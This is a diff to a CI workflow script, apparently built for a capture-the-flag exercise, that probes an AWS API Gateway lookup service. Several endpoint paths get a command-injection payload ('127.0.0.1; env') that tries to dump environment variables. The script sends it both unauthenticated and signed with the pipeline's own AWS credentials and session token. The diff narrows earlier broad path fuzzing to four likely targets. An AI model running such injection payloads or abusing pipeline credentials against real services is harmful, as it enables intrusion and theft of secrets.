@@ -25,28 +25,27 @@ jobs:
           REGION="us-east-1"
           BASE_URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev"
           PAYLOAD='{"domain": "127.0.0.1; env"}'
+          
+          # The most common paths for a lookup tool CTF
+          TARGET_PATHS=("/nslookup" "/" "/lookup" "/query")
 
-          # Common API path names
-          PATHS=("" "/" "/nslookup" "/lookup" "/dns" "/api" "/v1" "/v2" "/cmd" "/query" "/run")
-
-          echo "=== 1. FUZZING UNAUTHENTICATED PATHS ==="
-          for PATH_NAME in "${PATHS[@]}"; do
+          for PATH_NAME in "${TARGET_PATHS[@]}"; do
             URL="${BASE_URL}${PATH_NAME}"
-            echo "POST $URL"
-            RES=$(curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$PAYLOAD")
-            echo "   Response: $RES"
-          done
-
-          echo ""
-          echo "=== 2. TESTING WITH IAM SIGV4 SIGNING ==="
-          for PATH_NAME in "${PATHS[@]}"; do
-            URL="${BASE_URL}${PATH_NAME}"
-            echo "SIGNED POST $URL"
+            echo "-----------------------------------"
+            echo "Testing Target: $URL"
+            
+            # 1. Try Unauthenticated POST
             RES=$(curl -s -X POST "$URL" \
+              -H "Content-Type: application/json" \
+              -d "$PAYLOAD")
+            echo "Unauthenticated Response: $RES"
+            
+            # 2. Try IAM SigV4 Signed POST (using your cicdRole credentials)
+            SIGNED_RES=$(curl -s -X POST "$URL" \
               --aws-sigv4 "aws:amz:${REGION}:execute-api" \
               --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" \
               -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" \
               -H "Content-Type: application/json" \
               -d "$PAYLOAD")
-            echo "   Response: $RES"
+            echo "Signed Response: $SIGNED_RES"
           done
